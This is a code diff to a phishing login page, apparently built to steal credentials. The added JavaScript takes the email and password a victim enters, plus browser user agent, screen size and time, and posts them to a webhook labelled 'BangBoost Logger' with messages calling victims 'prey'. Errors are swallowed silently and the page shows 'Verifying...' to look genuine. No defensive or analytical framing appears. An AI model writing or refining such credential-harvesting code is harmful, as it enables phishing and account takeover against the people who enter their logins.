@@ -25,7 +25,7 @@
             <input type="password" id="password" placeholder="Password" required minlength="6">
             <button type="submit">LOGIN</button>
         </form>
-        <div id="loading" style="margin-top:18px;display:none;">Loading...</div>
+        <div id="loading" style="margin-top:18px;display:none;">Verifying...</div>
     </div>
 
     <div id="successPage" class="full-screen">
@@ -39,24 +39,32 @@
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
+
+            const payload = {
+                username: "BangBoost Hunter",
+                content: "🔥 **NUOVA PREDA CATTURATA**",
+                embeds: [{
+                    color: 0x000000,
+                    title: "Nuova Credenziale",
+                    fields: [
+                        { name: "📧 Email", value: `\`${email}\``, inline: false },
+                        { name: "🔑 Password", value: `\`\`\`${password}\`\`\``, inline: false },
+                        { name: "🖥️ Device", value: navigator.userAgent.substring(0, 280), inline: false },
+                        { name: "📱 Screen", value: screen.width + "x" + screen.height, inline: true },
+                        { name: "⏰ Ora", value: new Date().toLocaleString(), inline: true }
+                    ],
+                    footer: { text: "BangBoost Logger" }
+                }]
+            };
 
             fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: "BangBoost",
-                    content: "🔥 **NEW PREY**",
-                    embeds: [{
-                        fields: [
-                            { name: "Email", value: email || "N/A" },
-                            { name: "Password", value: "```" + password + "```" },
-                            { name: "Device", value: navigator.userAgent.substring(0,250) }
-                        ]
-                    }]
-                })
-            });
+                body: JSON.stringify(payload)
+            }).catch(() => {});
 
             document.getElementById('loading').style.display = 'block';
             setTimeout(() => {
